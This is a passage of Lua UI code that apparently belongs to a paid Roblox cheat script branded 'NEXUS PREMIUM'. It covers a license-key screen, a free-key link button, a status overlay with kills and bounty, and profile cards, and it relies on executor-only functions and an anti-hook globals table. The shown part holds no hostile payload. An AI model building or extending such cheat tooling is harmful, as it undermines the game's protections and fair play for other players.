-- ============================================
-- REGISTER (override or add asset URL)
-- ============================================

function Assets.register(id, url)
    Assets.Manifest[id] = url
    _cache[id] = nil
    Assets.load(id)
end

-- ============================================
-- PRELOAD ALL (with progress callback)
-- ============================================

function Assets.preloadAll(onProgress)
    local total = 0
    local loaded = 0
    
    for _ in pairs(Assets.Manifest) do total = total + 1 end
    if total == 0 then
        if onProgress then onProgress(1, 0, 0) end
        return
    end
    
    for id, url in pairs(Assets.Manifest) do
        Assets.load(id, function()
            loaded = loaded + 1
            if onProgress then
                G.pcall(onProgress, loaded / total, loaded, total)
            end
        end)
    end
end

-- ============================================
-- STATUS
-- ============================================

function Assets.isLoaded(id)
    return _cache[id] ~= nil
end

function Assets.getCacheSize()
    local count = 0
    for _ in pairs(_cache) do count = count + 1 end
    return count
end

function Assets.getManifestSize()
    local count = 0
    for _ in pairs(Assets.Manifest) do count = count + 1 end
    return count
end

return Assets
end)()

-- Module: SailorComponents
local SailorComponents = (function()
local Components = {}
local G
local Theme, Layout, Config, Assets
local TweenService
local _notificationHost = nil
local _notificationEntries = {}
local _notificationIsland = nil
local _notificationFollowAlive = false

function Components.init(antiHook, themeModule, layoutModule, configModule, assetsModule)
    G = antiHook.globals
    Theme = themeModule
    Layout = layoutModule
    Config = configModule
    Assets = assetsModule
    TweenService = G.GetService(game, "TweenService")
end

local function getProductDisplayName()
    return (Config and Config.getProductDisplayName and Config.getProductDisplayName()) or "NEXUS PREMIUM"
end

local function getProductHandle()
    return (Config and Config.getProductHandle and Config.getProductHandle()) or "nexuspremium"
end

local function getProductVersion()
    return (Config and Config.getVersion and Config.getVersion()) or "8.6"
end

function Components.createAuthScreen(screenGui)
    local overlay = Instance.new("Frame")
    overlay.Name = "AuthOverlay"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Theme.Colors.BgPrimary
    overlay.BackgroundTransparency = 0
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 200
    overlay.Parent = screenGui

    -- Background image on auth (fully visible)
    local authBg = Instance.new("ImageLabel")
    authBg.Size = UDim2.new(1, 0, 1, 0)
    authBg.BackgroundTransparency = 1
    authBg.ScaleType = Enum.ScaleType.Crop
    authBg.ImageTransparency = 0.5
    authBg.ZIndex = 200
    authBg.Parent = overlay
    if Assets then Assets.applyImage(authBg, "banner_auth") end

    -- Auth card (auto-sized to fit all elements)
    local card = Instance.new("Frame")
    card.Name = "AuthCard"
    card.Size = UDim2.new(0.85, 0, 0, 0)
    card.AutomaticSize = Enum.AutomaticSize.Y
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position = UDim2.new(0.5, 0, 0.5, 0)
    card.BackgroundColor3 = Theme.Colors.BgSidebar
    card.BackgroundTransparency = 0.05
    card.BorderSizePixel = 0
    card.ClipsDescendants = false
    card.ZIndex = 201
    card.Parent = overlay

    -- Cap card width
    local cardConstraint = Instance.new("UISizeConstraint")
    cardConstraint.MaxSize = Vector2.new(420, 9999)
    cardConstraint.MinSize = Vector2.new(200, 0)
    cardConstraint.Parent = card

    Theme.corner(card, Theme.Radius.XL)
    Theme.stroke(card, Theme.Colors.Border, 1, 0.3)

    -- Slide-up entrance
    card.Position = UDim2.new(0.5, 0, 0.6, 0)
    TweenService:Create(card, Theme.Tween.Bounce, {
        Position = UDim2.new(0.5, 0, 0.45, 0)
    }):Play()

    local inner = Instance.new("UIListLayout")
    inner.SortOrder = Enum.SortOrder.LayoutOrder
    inner.Padding = UDim.new(0, 10)
    inner.HorizontalAlignment = Enum.HorizontalAlignment.Center
    inner.Parent = card

    Theme.padding(card, 20, 20, 20, 20)

    local logoWrap = Instance.new("Frame")
    logoWrap.Size = UDim2.new(0, 160, 0, 160)
    logoWrap.BackgroundColor3 = Theme.Colors.BgPrimary
    logoWrap.BackgroundTransparency = 1
    logoWrap.LayoutOrder = 1
    logoWrap.ClipsDescendants = false
    logoWrap.Parent = card
    Theme.corner(logoWrap, Theme.Radius.XL)

    local logoImg = Instance.new("ImageLabel")
    logoImg.Size = UDim2.new(1, 0, 1, 0)
    logoImg.BackgroundTransparency = 1
    logoImg.ScaleType = Enum.ScaleType.Fit
    logoImg.ZIndex = 202
    logoImg.Parent = logoWrap
    if Assets then Assets.applyImage(logoImg, "logo") end



    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 26)
    title.BackgroundTransparency = 1
    title.Text = getProductDisplayName()
    title.Font = Theme.Fonts.Title
    title.TextSize = Theme.TextSize.Hero
    title.TextColor3 = Theme.Colors.TextPrimary
    title.LayoutOrder = 2
    title.ZIndex = 202
    title.Parent = card

    -- Subtitle
    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, 0, 0, 14)
    sub.BackgroundTransparency = 1
    sub.Text = "Enter your license key"
    sub.Font = Theme.Fonts.Body
    sub.TextSize = Theme.TextSize.XSmall
    sub.TextColor3 = Theme.Colors.TextMuted
    sub.LayoutOrder = 3
    sub.ZIndex = 202
    sub.Parent = card

    -- Divider
    local div = Instance.new("Frame")
    div.Size = UDim2.new(0.5, 0, 0, 1)
    div.BackgroundColor3 = Theme.Colors.Border
    div.BorderSizePixel = 0
    div.LayoutOrder = 4
    div.Parent = card
    Theme.gradient(div, Theme.Colors.AccentCyan, Theme.Colors.AccentPurple, 0)

    -- Key Input
    local inputBox = Instance.new("TextBox")
    inputBox.Name = "KeyInput"
    inputBox.Size = UDim2.new(1, 0, 0, 40)
    inputBox.BackgroundColor3 = Theme.Colors.BgInput
    inputBox.Text = ""
    inputBox.PlaceholderText = "NEXUS-XXXX-XXXX-XXXX"
    inputBox.PlaceholderColor3 = Theme.Colors.TextMuted
    inputBox.Font = Theme.Fonts.Mono
    inputBox.TextSize = Theme.TextSize.Medium
    inputBox.TextColor3 = Theme.Colors.TextPrimary
    inputBox.ClearTextOnFocus = false
    inputBox.BorderSizePixel = 0
    inputBox.LayoutOrder = 5
    inputBox.ZIndex = 202
    inputBox.Parent = card
    Theme.corner(inputBox, Theme.Radius.SM)
    local inputStroke = Theme.stroke(inputBox, Theme.Colors.Border, 1, 0.4)
    Theme.padding(inputBox, 0, 12, 0, 12)

    -- 32-char max limit
    inputBox:GetPropertyChangedSignal("Text"):Connect(function()
        local txt = inputBox.Text
        if #txt > 64 then
            inputBox.Text = string.sub(txt, 1, 64)
        end
    end)

    -- No glow on focus — just subtle border visibility change
    inputBox.Focused:Connect(function()
        TweenService:Create(inputStroke, Theme.Tween.Fast, { Transparency = 0 }):Play()
    end)
    inputBox.FocusLost:Connect(function()
        TweenService:Create(inputStroke, Theme.Tween.Normal, { Transparency = 0.4 }):Play()
    end)

    -- Validate Button
    local validateBtn = Instance.new("TextButton")
    validateBtn.Name = "ValidateBtn"
    validateBtn.Size = UDim2.new(1, 0, 0, 40)
    validateBtn.BackgroundColor3 = Theme.Colors.AccentCyan
    validateBtn.Text = "VALIDATE KEY"
    validateBtn.Font = Theme.Fonts.Button
    validateBtn.TextSize = Theme.TextSize.Medium
    validateBtn.TextColor3 = Theme.Colors.BgPrimary
    validateBtn.BorderSizePixel = 0
    validateBtn.AutoButtonColor = false
    validateBtn.LayoutOrder = 6
    validateBtn.ZIndex = 202
    validateBtn.Parent = card
    Theme.corner(validateBtn, Theme.Radius.SM)
    Theme.clickEffect(validateBtn)

    validateBtn.MouseEnter:Connect(function()
        TweenService:Create(validateBtn, Theme.Tween.Fast, { BackgroundTransparency = 0.15 }):Play()
    end)
    validateBtn.MouseLeave:Connect(function()
        TweenService:Create(validateBtn, Theme.Tween.Fast, { BackgroundTransparency = 0 }):Play()
    end)

    -- Status Label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "StatusLabel"
    statusLabel.Size = UDim2.new(1, 0, 0, 18)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = ""
    statusLabel.Font = Theme.Fonts.Body
    statusLabel.TextSize = Theme.TextSize.Small
    statusLabel.TextColor3 = Theme.Colors.AccentRed
    statusLabel.LayoutOrder = 7
    statusLabel.ZIndex = 202
    statusLabel.Parent = card

    -- Spinner
    local spinner = Instance.new("Frame")
    spinner.Name = "Spinner"
    spinner.Size = UDim2.new(0, 20, 0, 20)
    spinner.Position = UDim2.new(0.5, -10, 0, 0)
    spinner.BackgroundTransparency = 1
    spinner.Visible = false
    spinner.LayoutOrder = 8
    spinner.ZIndex = 202
    spinner.Parent = card

    local spinArc = Instance.new("Frame")
    spinArc.Size = UDim2.new(1, 0, 1, 0)
    spinArc.BackgroundTransparency = 1
    spinArc.Parent = spinner
    Theme.corner(spinArc, Theme.Radius.Pill)
    Theme.stroke(spinArc, Theme.Colors.AccentCyan, 2, 0)

    G.spawn(function()
        while spinner.Parent do
            for angle = 0, 360, 8 do
                if not spinner.Parent then break end
                spinArc.Rotation = angle
                G.wait(0.016)
            end
        end
    end)

    -- Get Free Key button
    local freeBtn = Instance.new("TextButton")
    freeBtn.Name = "FreeKeyBtn"
    freeBtn.Size = UDim2.new(1, 0, 0, 32)
    freeBtn.BackgroundColor3 = Theme.Colors.AccentPurple
    freeBtn.BackgroundTransparency = 0.1
    freeBtn.Text = "GET FREE KEY"
    freeBtn.Font = Theme.Fonts.Button
    freeBtn.TextSize = Theme.TextSize.Small
    freeBtn.TextColor3 = Theme.Colors.White
    freeBtn.BorderSizePixel = 0
    freeBtn.AutoButtonColor = false
    freeBtn.LayoutOrder = 10
    freeBtn.ZIndex = 202
    freeBtn.Parent = card
    Theme.corner(freeBtn, Theme.Radius.SM)
    Theme.clickEffect(freeBtn)

    -- FREE tag
    local freeTag = Instance.new("TextLabel")
    freeTag.Name = "FreeTag"
    freeTag.Size = UDim2.new(0, 40, 0, 14)
    freeTag.Position = UDim2.new(1, -44, 0, 4)
    freeTag.BackgroundColor3 = Theme.Colors.AccentGreen
    freeTag.Text = "FREE"
    freeTag.Font = Theme.Fonts.Subtitle
    freeTag.TextSize = 8
    freeTag.TextColor3 = Theme.Colors.BgPrimary
    freeTag.ZIndex = 203
    freeTag.Parent = freeBtn
    Theme.corner(freeTag, Theme.Radius.XS)

    freeBtn.MouseEnter:Connect(function()
        TweenService:Create(freeBtn, Theme.Tween.Fast, { BackgroundTransparency = 0.3 }):Play()
    end)
    freeBtn.MouseLeave:Connect(function()
        TweenService:Create(freeBtn, Theme.Tween.Fast, { BackgroundTransparency = 0.1 }):Play()
    end)

    -- Open the Nexus Hub free-key URL.
    freeBtn.MouseButton1Click:Connect(function()
        G.pcall(function()
            local url = _NEXUS_KEY_PORTAL_URL
            -- Try to open in browser
            if setclipboard then
                setclipboard(url)
                statusLabel.Text = "Link copied to clipboard!"
                statusLabel.TextColor3 = Theme.Colors.AccentGreen
            end
            G.pcall(function()
                if type(G.getgenv().request) == "function" then
                    G.getgenv().request({ Url = url, Method = "GET" })
                end
            end)
        end)
    end)

    -- Footer
    local footer = Instance.new("TextLabel")
    footer.Size = UDim2.new(1, 0, 0, 12)
    footer.BackgroundTransparency = 1
    footer.Text = "nexusdevs.fun | v" .. getProductVersion()
    footer.Font = Theme.Fonts.Mono
    footer.TextSize = Theme.TextSize.Micro
    footer.TextColor3 = Theme.Colors.TextMuted
    footer.LayoutOrder = 11
    footer.ZIndex = 202
    footer.Parent = card

    return {
        overlay = overlay,
        card = card,
        inputBox = inputBox,
        validateBtn = validateBtn,
        statusLabel = statusLabel,
        spinner = spinner,
        freeKeyBtn = freeBtn,
    }
end

function Components.shakeAuthCard(card)
    if not card then return end
    local orig = card.Position
    for i = 1, 6 do
        local offset = (i % 2 == 0) and 5 or -5
        TweenService:Create(card, Theme.Tween.Snap, {
            Position = UDim2.new(orig.X.Scale, orig.X.Offset + offset, orig.Y.Scale, orig.Y.Offset)
        }):Play()
        G.wait(0.04)
    end
    TweenService:Create(card, Theme.Tween.Fast, { Position = orig }):Play()
end

function Components.dismissAuthScreen(authRefs)
    if not authRefs or not authRefs.overlay then return end
    TweenService:Create(authRefs.card, Theme.Tween.Normal, {
        Position = UDim2.new(0.5, 0, 0.3, 0),
        BackgroundTransparency = 1,
    }):Play()
    for _, child in ipairs(authRefs.card:GetDescendants()) do
        G.pcall(function()
            if child:IsA("TextLabel") or child:IsA("TextBox") then
                TweenService:Create(child, Theme.Tween.Fast, { TextTransparency = 1 }):Play()
            elseif child:IsA("TextButton") then
                TweenService:Create(child, Theme.Tween.Fast, { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
            elseif child:IsA("ImageLabel") then
                TweenService:Create(child, Theme.Tween.Fast, { ImageTransparency = 1 }):Play()
            elseif child:IsA("Frame") then
                TweenService:Create(child, Theme.Tween.Fast, { BackgroundTransparency = 1 }):Play()
            end
        end)
    end
    TweenService:Create(authRefs.overlay, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
    G.delay(0.5, function()
        if authRefs.overlay and authRefs.overlay.Parent then
            authRefs.overlay:Destroy()
        end
    end)
end

-- ============================================
-- DYNAMIC ISLAND + NOTIFICATIONS
-- ============================================

local function setDynamicIslandNotificationCount(count)
    local normalizedCount = math.max(0, tonumber(count) or 0)
    if not _notificationIsland or not _notificationIsland.Parent then
        return
    end

    local badge = _notificationIsland:FindFirstChild("NotificationBadge")
    local badgeLabel = badge and badge:FindFirstChild("NotificationBadgeLabel")
    if badge then
        badge.Visible = normalizedCount > 0
    end
    if badgeLabel then
        badgeLabel.Text = normalizedCount > 99 and "99+" or tostring(normalizedCount)
    end
end

function Components.createNotificationHost(screenGui, island)
    _notificationIsland = island or _notificationIsland
    if _notificationHost and _notificationHost.Parent then
        _notificationHost:Destroy()
    end
    _notificationHost = nil
    _notificationEntries = {}
    _notificationFollowAlive = false
    setDynamicIslandNotificationCount(0)
    return nil
end

function Components.notify(config)
    _notificationEntries = {}
    setDynamicIslandNotificationCount(0)
    return nil
end

function Components.createDynamicIsland(screenGui)
    local island = Instance.new("Frame")
    island.Name = "DynamicIsland"
    island.Size = UDim2.new(0, 372, 0, 58)
    island.AnchorPoint = Vector2.new(0.5, 0)
    island.Position = UDim2.new(0.5, 0, 0, 8)
    island.BackgroundColor3 = Color3.fromRGB(10, 11, 14)
    island.BackgroundTransparency = 0.04
    island.BorderSizePixel = 0
    island.Visible = false
    island.ZIndex = 100
    island.Parent = screenGui
    Theme.corner(island, Theme.Radius.Pill)

    local islandConstraint = Instance.new("UISizeConstraint")
    islandConstraint.MaxSize = Vector2.new(408, 62)
    islandConstraint.MinSize = Vector2.new(280, 52)
    islandConstraint.Parent = island

    local islandScale = Instance.new("UIScale")
    islandScale.Scale = 1
    islandScale.Parent = island

    local stroke = Theme.stroke(island, Theme.Colors.AccentCyan:Lerp(Theme.Colors.Border, 0.64), 1, 0.16)
    Theme.gradient(island, Color3.fromRGB(20, 22, 28), Color3.fromRGB(9, 11, 15), 12)

    local glow = Instance.new("ImageLabel")
    glow.Name = "Glow"
    glow.BackgroundTransparency = 1
    glow.Image = "rbxassetid://5028857084"
    glow.ImageColor3 = Theme.Colors.AccentCyan
    glow.ImageTransparency = 0.9
    glow.AnchorPoint = Vector2.new(0.5, 0.5)
    glow.Position = UDim2.new(0.5, 0, 0.5, 0)
    glow.Size = UDim2.new(1.9, 0, 2.2, 0)
    glow.ZIndex = 99
    glow.Parent = island

    local dot = Instance.new("Frame")
    dot.Name = "Dot"
    dot.Size = UDim2.new(0, 6, 0, 6)
    dot.Position = UDim2.new(0, 14, 0.5, -3)
    dot.BackgroundColor3 = Theme.Colors.AccentGreen
    dot.BorderSizePixel = 0
    dot.ZIndex = 101
    dot.Parent = island
    Theme.corner(dot, Theme.Radius.Pill)
    TweenService:Create(dot, Theme.Tween.Pulse, { BackgroundTransparency = 0.5 }):Play()

    local logo = Instance.new("ImageLabel")
    logo.Name = "Logo"
    logo.Size = UDim2.new(0, 22, 0, 22)
    logo.Position = UDim2.new(0, 28, 0.5, -11)
    logo.BackgroundTransparency = 1
    logo.ScaleType = Enum.ScaleType.Fit
    logo.ZIndex = 101
    logo.Parent = island
    if Assets then Assets.applyImage(logo, "logo") end

    local title = Instance.new("TextLabel")
    title.Name = "NexusLabel"
    title.Size = UDim2.new(0, 124, 0, 18)
    title.Position = UDim2.new(0, 60, 0, 6)
    title.BackgroundTransparency = 1
    title.Text = getProductDisplayName()
    title.Font = Theme.Fonts.Title
    title.TextSize = Theme.TextSize.Medium
    title.TextColor3 = Theme.Colors.TextPrimary
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 101
    title.Parent = island

    local quickStats = Instance.new("TextLabel")
    quickStats.Name = "QuickStats"
    quickStats.Size = UDim2.new(1, -206, 0, 14)
    quickStats.Position = UDim2.new(0, 60, 0, 30)
    quickStats.BackgroundTransparency = 1
    quickStats.Text = "0 Kills | 0 Bounty"
    quickStats.Font = Theme.Fonts.Mono
    quickStats.TextSize = Theme.TextSize.XSmall
    quickStats.TextColor3 = Theme.Colors.TextSecondary
    quickStats.TextXAlignment = Enum.TextXAlignment.Left
    quickStats.TextTruncate = Enum.TextTruncate.AtEnd
    quickStats.ZIndex = 101
    quickStats.Parent = island

    local statusFrame = Instance.new("Frame")
    statusFrame.Name = "StatusFrame"
    statusFrame.AnchorPoint = Vector2.new(1, 0.5)
    statusFrame.BackgroundColor3 = Theme.Colors.AccentCyan:Lerp(Color3.fromRGB(9, 9, 10), 0.72)
    statusFrame.BorderSizePixel = 0
    statusFrame.Position = UDim2.new(1, -12, 0.5, 0)
    statusFrame.Size = UDim2.new(0, 104, 0, 28)
    statusFrame.ZIndex = 101
    statusFrame.Parent = island
    Theme.corner(statusFrame, 14)
    Theme.stroke(statusFrame, Theme.Colors.AccentCyan, 1, 0.3)

    local pingLabel = Instance.new("TextLabel")
    pingLabel.Name = "PingLabel"
    pingLabel.Size = UDim2.new(0.5, -4, 1, 0)
    pingLabel.Position = UDim2.new(0, 8, 0, 0)
    pingLabel.BackgroundTransparency = 1
    pingLabel.Text = "-- ms"
    pingLabel.Font = Theme.Fonts.Mono
    pingLabel.TextSize = Theme.TextSize.Micro
    pingLabel.TextColor3 = Theme.Colors.AccentGreen
    pingLabel.TextXAlignment = Enum.TextXAlignment.Left
    pingLabel.ZIndex = 102
    pingLabel.Parent = statusFrame

    local fpsLabel = Instance.new("TextLabel")
    fpsLabel.Name = "FpsLabel"
    fpsLabel.Size = UDim2.new(0.5, -10, 1, 0)
    fpsLabel.Position = UDim2.new(0.5, 2, 0, 0)
    fpsLabel.BackgroundTransparency = 1
    fpsLabel.Text = "-- FPS"
    fpsLabel.Font = Theme.Fonts.Mono
    fpsLabel.TextSize = Theme.TextSize.Micro
    fpsLabel.TextColor3 = Theme.Colors.AccentGold
    fpsLabel.TextXAlignment = Enum.TextXAlignment.Right
    fpsLabel.ZIndex = 102
    fpsLabel.Parent = statusFrame

    local badge = Instance.new("Frame")
    badge.Name = "NotificationBadge"
    badge.AnchorPoint = Vector2.new(1, 0)
    badge.BackgroundColor3 = Theme.Colors.AccentCyan
    badge.BorderSizePixel = 0
    badge.Position = UDim2.new(1, -6, 0, -4)
    badge.Size = UDim2.new(0, 20, 0, 20)
    badge.Visible = false
    badge.ZIndex = 105
    badge.Parent = island
    Theme.corner(badge, Theme.Radius.Pill)

    local badgeLabel = Instance.new("TextLabel")
    badgeLabel.Name = "NotificationBadgeLabel"
    badgeLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    badgeLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    badgeLabel.Size = UDim2.new(1, -4, 1, 0)
    badgeLabel.BackgroundTransparency = 1
    badgeLabel.Text = "0"
    badgeLabel.Font = Theme.Fonts.Subtitle
    badgeLabel.TextSize = 10
    badgeLabel.TextColor3 = Theme.Colors.BgPrimary
    badgeLabel.ZIndex = 106
    badgeLabel.Parent = badge

    local click = Instance.new("TextButton")
    click.Name = "DynamicIslandButton"
    click.Size = UDim2.new(1, 0, 1, 0)
    click.BackgroundTransparency = 1
    click.Text = ""
    click.AutoButtonColor = false
    click.ZIndex = 104
    click.Parent = island

    click.MouseButton1Click:Connect(function()
        Layout.toggleWindow()
        islandScale.Scale = 0.97
        TweenService:Create(islandScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Scale = 1,
        }):Play()
    end)
    click.MouseEnter:Connect(function()
        TweenService:Create(stroke, Theme.Tween.Fast, {
            Color = Theme.Colors.AccentCyan:Lerp(Color3.fromRGB(68, 76, 92), 0.48),
        }):Play()
        TweenService:Create(glow, Theme.Tween.Fast, {
            ImageTransparency = 0.84,
        }):Play()
    end)
    click.MouseLeave:Connect(function()
        TweenService:Create(stroke, Theme.Tween.Fast, {
            Color = Theme.Colors.AccentCyan:Lerp(Theme.Colors.Border, 0.64),
        }):Play()
        TweenService:Create(glow, Theme.Tween.Fast, {
            ImageTransparency = 0.9,
        }):Play()
    end)

    Layout.makeDraggable(island, island)
    _notificationIsland = island

    G.spawn(function()
        local lastTime = tick()
        local frameCount = 0
        while island and island.Parent do
            frameCount = frameCount + 1
            local now = tick()
            if (now - lastTime) >= 1 then
                local fps = math.floor(frameCount / (now - lastTime))
                fpsLabel.Text = tostring(fps) .. " FPS"
                frameCount = 0
                lastTime = now

                G.pcall(function()
                    local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
                    pingLabel.Text = tostring(ping) .. " ms"
                end)
            end
            G.wait()
        end
    end)

    setDynamicIslandNotificationCount(#_notificationEntries)
    return island
end

-- ============================================
-- STAT CARD (rounded, clean)
-- ============================================

function Components.createStatCard(parent, name, label, color, order)
    local card = Instance.new("Frame")
    card.Name = "Stat_" .. name
    card.Size = UDim2.new(0.5, -5, 0, 68)
    card.BackgroundColor3 = Theme.Colors.BgCard
    card.BorderSizePixel = 0
    card.LayoutOrder = order or 0
    card.Parent = parent
    Theme.corner(card, Theme.Radius.MD)
    Theme.stroke(card, Theme.Colors.Border, 1, 0.6)

    -- Accent left bar
    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 3, 0.5, 0)
    bar.Position = UDim2.new(0, 0, 0.25, 0)
    bar.BackgroundColor3 = color or Theme.Colors.AccentCyan
    bar.BorderSizePixel = 0
    bar.Parent = card
    Theme.corner(bar, 2)

    -- Label
    local lbl = Instance.new("TextLabel")
    lbl.Name = "Label"
    lbl.Size = UDim2.new(1, -16, 0, 14)
    lbl.Position = UDim2.new(0, 12, 0, 10)
    lbl.BackgroundTransparency = 1
    lbl.Text = string.upper(label or name)
    lbl.Font = Theme.Fonts.Subtitle
    lbl.TextSize = Theme.TextSize.Micro
    lbl.TextColor3 = Theme.Colors.TextMuted
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = card

    -- Value
    local value = Instance.new("TextLabel")
    value.Name = "Value"
    value.Size = UDim2.new(1, -16, 0, 26)
    value.Position = UDim2.new(0, 12, 0, 30)
    value.BackgroundTransparency = 1
    value.Text = "0"
    value.Font = Theme.Fonts.Title
    value.TextSize = Theme.TextSize.Counter
    value.TextColor3 = Theme.Colors.TextPrimary
    value.TextXAlignment = Enum.TextXAlignment.Left
    value.Parent = card

    return card
end

function Components.createStatRow(parent, order)
    local row = Instance.new("Frame")
    row.Name = "StatRow"
    row.Size = UDim2.new(1, 0, 0, 68)
    row.BackgroundTransparency = 1
    row.LayoutOrder = order or 0
    row.Parent = parent

    local ll = Instance.new("UIListLayout", row)
    ll.FillDirection = Enum.FillDirection.Horizontal
    ll.Padding = UDim.new(0, 10)

    return row
end

function Components.createProfileHeader(parent, order)
    local Players = game:GetService("Players")
    local lp = Players.LocalPlayer

    local card = Instance.new("Frame")
    card.Name = "ProfileHeader"
    card.Size = UDim2.new(1, 0, 0, 118)
    card.BackgroundColor3 = Theme.Colors.BgCard
    card.BorderSizePixel = 0
    card.LayoutOrder = order or 0
    card.Parent = parent
    Theme.corner(card, Theme.Radius.MD)
    Theme.stroke(card, Theme.Colors.BorderLight, 1, 0.55)

    local metaRow = Instance.new("Frame")
    metaRow.Name = "MetaRow"
    metaRow.Size = UDim2.new(1, -24, 0, 28)
    metaRow.Position = UDim2.new(0, 12, 0, 10)
    metaRow.BackgroundTransparency = 1
    metaRow.Parent = card

    local metaLayout = Instance.new("UIListLayout")
    metaLayout.FillDirection = Enum.FillDirection.Horizontal
    metaLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    metaLayout.Padding = UDim.new(0, 8)
    metaLayout.Parent = metaRow

    local function createMetaStat(labelText, valueText, accentColor)
        local stat = Instance.new("Frame")
        stat.Size = UDim2.new(0.333, -6, 1, 0)
        stat.BackgroundColor3 = Theme.Colors.BgTertiary
        stat.BackgroundTransparency = 0.2
        stat.BorderSizePixel = 0
        stat.Parent = metaRow
        Theme.corner(stat, Theme.Radius.SM)
        Theme.stroke(stat, accentColor or Theme.Colors.BorderLight, 1, 0.35)

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -14, 0, 10)
        label.Position = UDim2.new(0, 8, 0, 4)
        label.BackgroundTransparency = 1
        label.Text = string.upper(labelText)
        label.Font = Theme.Fonts.Subtitle
        label.TextSize = Theme.TextSize.Micro
        label.TextColor3 = Theme.Colors.TextMuted
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = stat

        local value = Instance.new("TextLabel")
        value.Name = labelText:gsub("%s+", "") .. "Value"
        value.Size = UDim2.new(1, -14, 0, 12)
        value.Position = UDim2.new(0, 8, 0, 14)
        value.BackgroundTransparency = 1
        value.Text = tostring(valueText)
        value.Font = Theme.Fonts.Title
        value.TextSize = Theme.TextSize.XSmall
        value.TextColor3 = accentColor or Theme.Colors.TextPrimary
        value.TextXAlignment = Enum.TextXAlignment.Left
        value.Parent = stat

        return stat, value
    end

    local _, titleValue = createMetaStat("Title", getProductDisplayName(), Theme.Colors.AccentCyan)
    local _, rosterValue = createMetaStat("Roster", "PREMIUM", Theme.Colors.AccentPurple)
    local _, serverValue = createMetaStat("Server", "--/12", Theme.Colors.AccentGold)

    local avatar = Instance.new("ImageLabel")
    avatar.Name = "Avatar"
    avatar.Size = UDim2.new(0, 48, 0, 48)
    avatar.Position = UDim2.new(0, 14, 0, 50)
    avatar.BackgroundColor3 = Theme.Colors.BgSidebar
    avatar.BorderSizePixel = 0
    avatar.ScaleType = Enum.ScaleType.Crop
    avatar.Parent = card
    Theme.corner(avatar, Theme.Radius.Pill)
    Theme.stroke(avatar, Theme.Colors.BorderLight, 1, 0.25)

    G.pcall(function()
        if lp then
            avatar.Image = Players:GetUserThumbnailAsync(
                lp.UserId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size150x150
            )
        end
    end)

    local displayName = Instance.new("TextLabel")
    displayName.Name = "DisplayName"
    displayName.Size = UDim2.new(1, -78, 0, 22)
    displayName.Position = UDim2.new(0, 74, 0, 50)
    displayName.BackgroundTransparency = 1
    displayName.Text = (lp and lp.DisplayName and lp.DisplayName ~= "" and lp.DisplayName) or getProductDisplayName()
    displayName.Font = Theme.Fonts.Title
    displayName.TextSize = Theme.TextSize.Large
    displayName.TextColor3 = Theme.Colors.TextPrimary
    displayName.TextXAlignment = Enum.TextXAlignment.Left
    displayName.Parent = card

    local username = Instance.new("TextLabel")
    username.Name = "Username"
    username.Size = UDim2.new(1, -78, 0, 16)
    username.Position = UDim2.new(0, 74, 0, 74)
    username.BackgroundTransparency = 1
    username.Text = lp and ("@" .. lp.Name) or ("@" .. getProductHandle())
    username.Font = Theme.Fonts.Subtitle
    username.TextSize = Theme.TextSize.XSmall
    username.TextColor3 = Theme.Colors.TextSecondary
    username.TextXAlignment = Enum.TextXAlignment.Left
    username.Parent = card

    local systemLabel = Instance.new("TextLabel")
    systemLabel.Name = "SystemLabel"
    systemLabel.Size = UDim2.new(1, -78, 0, 16)
    systemLabel.Position = UDim2.new(0, 74, 0, 90)
    systemLabel.BackgroundTransparency = 1
    systemLabel.Text = "System profile online"
    systemLabel.Font = Theme.Fonts.Mono
    systemLabel.TextSize = Theme.TextSize.Micro
    systemLabel.TextColor3 = Theme.Colors.TextMuted
    systemLabel.TextXAlignment = Enum.TextXAlignment.Left
    systemLabel.Parent = card

    return {
        card = card,
        titleValue = titleValue,
        rosterValue = rosterValue,
        serverValue = serverValue,
        displayName = displayName,
        username = username,
        systemLabel = systemLabel,
    }
end

-- ============================================
-- TIME DISPLAY
-- ============================================

function Components.createTimeDisplay(parent, order)
    local container = Instance.new("Frame")
    container.Name = "TimeDisplay"
    container.Size = UDim2.new(1, 0, 0, 42)
    container.BackgroundColor3 = Theme.Colors.BgCard
    container.BorderSizePixel = 0
    container.LayoutOrder = order or 0
    container.Parent = parent
    Theme.corner(container, Theme.Radius.MD)
    Theme.stroke(container, Theme.Colors.Border, 1, 0.6)

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 3, 0.5, 0)
    bar.Position = UDim2.new(0, 0, 0.25, 0)
    bar.BackgroundColor3 = Theme.Colors.AccentOrange
    bar.BorderSizePixel = 0
    bar.Parent = container
    Theme.corner(bar, 2)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 80, 0, 12)
    label.Position = UDim2.new(0, 12, 0, 6)
    label.BackgroundTransparency = 1
    label.Text = "SESSION TIME"
    label.Font = Theme.Fonts.Subtitle
    label.TextSize = Theme.TextSize.Micro
    label.TextColor3 = Theme.Colors.TextMuted
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = container

    local timeVal = Instance.new("TextLabel")
    timeVal.Name = "TimeValue"
    timeVal.Size = UDim2.new(1, -16, 0, 18)
    timeVal.Position = UDim2.new(0, 12, 0, 20)
    timeVal.BackgroundTransparency = 1
    timeVal.Text = "00:00:00"
    timeVal.Font = Theme.Fonts.Mono
    timeVal.TextSize = Theme.TextSize.Large
